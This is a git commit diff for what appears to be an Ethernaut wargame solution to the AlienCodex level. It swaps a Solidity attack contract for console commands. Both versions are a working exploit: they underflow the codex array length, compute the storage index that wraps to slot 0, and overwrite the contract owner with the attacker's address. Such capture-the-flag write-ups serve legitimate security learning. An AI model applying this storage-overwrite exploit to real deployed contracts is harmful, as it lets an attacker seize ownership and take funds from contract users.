3303dabd810c3c654c1c9011563b67379afa573c
JP2308 <149300792+JP2308@users.noreply.github.com>
2024-02-24 12:50:24 +1100

    aliencodex solution updated to command line

--- Ethernaut/Solutions/AlienCodex.ts
+++ Ethernaut/Solutions/AlienCodex.ts
@@ -1,16 +1,22 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.5.0;
+// use the command line with the following commands
 
-import "../instances/AlienCodex.sol";
+//make contact to ensure that we pass the check contacted
+await contract.makeContact()
 
-contract AlienHack {
-    AlienCodex level19 = AlienCodex(/*address here*/);
+//modify codex length by abusing underflow - opens up the maximum storage of the contract
+await contract.retract()
 
-    function exploit () external {
-        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
-        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
-        level19.make_contact();
-        level19.retract();
-        level19.revise(index, myAddress);
-    }
-}
+//Calculate position, p in storage of start of codex array
+p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
+
+//Calculate the required index, i. Use BigInt for mathematical calculations between very large numbers.
+i = BigInt(2 ** 256) - BigInt(p)
+
+//value to be put must be 32 byte, pad the player address on left with 0s to make a total of 32 byte. 
+content = '0x' + '0'.repeat(24) + player.slice(2)
+
+//Finally call revise to alter the storage slot:
+await contract.revise(i, content)
+
+//verify success by the following (output should be true)
+await contract.owner() === player
